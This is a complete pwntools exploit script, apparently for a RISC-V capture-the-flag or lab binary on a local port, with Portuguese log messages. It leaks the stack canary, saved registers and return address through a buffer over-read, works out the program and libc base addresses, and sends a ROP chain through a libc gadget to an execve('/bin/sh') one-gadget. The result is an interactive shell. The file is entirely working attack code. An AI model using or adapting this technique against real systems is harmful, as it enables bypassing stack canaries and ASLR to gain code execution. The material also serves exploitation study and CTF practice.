from pwn import *

conn = remote('localhost', 5000)

def leak(off, size):
    if size <= 0:
        return b''
    log.info('enviando %d bytes para vazar %d bytes', off, size)
    conn.sendline(off*b'A')
    received = conn.recvline()
    log.info('recebido %r', received)
    leaked = received[off:-1]
    leaked = leaked[:size]
    off += len(leaked)
    size -= len(leaked)
    if size != 0:
        leaked += b'\x00'
        off += 1
        size -= 1
    return leaked + leak(off, size)


# buf     @ sp+8
# canary  @ sp+40 == buf+32
# orig s0 @ sp+48 == buf+40
# orig ra @ sp+56 == buf+48

canario = u64(leak(32, 8))
log.info('canário: 0x%016x', canario)

s0 = u64(leak(40,8))
log.info('s0: 0x%016x', s0)

ra = u64(leak(48, 8))
log.info('ra: 0x%016x', ra)

base_programa = ra - 0xa20
log.info('base_programa: 0x%016x', base_programa)

# <__libc_start_call_main+0038> jal 0x74099ca5ae3e <exit>
ret_libc = u64(leak(80,8))
log.info('ret_libc: 0x%016x', ret_libc)
base_libc = ret_libc - 0x4a6 - 0x27390
log.info('base_libc: 0x%016x', base_libc)

"""
.text:0000000000027FAA                 ld              ra, 88(sp)
.text:0000000000027FAC                 ld              s0, 80(sp)
.text:0000000000027FAE                 ld              s1, 72(sp)
.text:0000000000027FB0                 ld              s2, 64(sp)
.text:0000000000027FB2                 ld              s3, 56(sp)
.text:0000000000027FB4                 ld              s4, 48(sp)
.text:0000000000027FB6                 ld              s5, 40(sp)
.text:0000000000027FB8                 ld              s6, 32(sp)
.text:0000000000027FBA                 ld              s8, 16(sp)
.text:0000000000027FBC                 addi            sp, sp, 96
.text:0000000000027FBE                 ret
"""
charger_gadget = base_libc + 0x27faa

"""
.text:000000000009523C                 mv              a2, s3
.text:000000000009523E                 mv              a1, s1
.text:0000000000095240                 la              a0, aBinSh # "/bin/sh"
.text:0000000000095248                 jal             execve
"""
onegadget = base_libc + 0x9523C

conn.sendline(32*b'A' + p64(canario) + p64(s0) +

              p64(charger_gadget) +
              16*b'A' +                   # filling
              p64(0)  +           # s8
              8 *b'A'  +                  # filling
              p64(0)  +           # s6
              p64(0)  +           # s5
              p64(0)  +           # s4
              p64(0)  +           # s3
              p64(0)  +           # s2
              p64(0)  +           # s1
              p64(0)  +           # s0
              p64(onegadget)      # ra
    )
log.info('recebido %r', conn.recvline())
conn.sendline(b'')
conn.interactive()
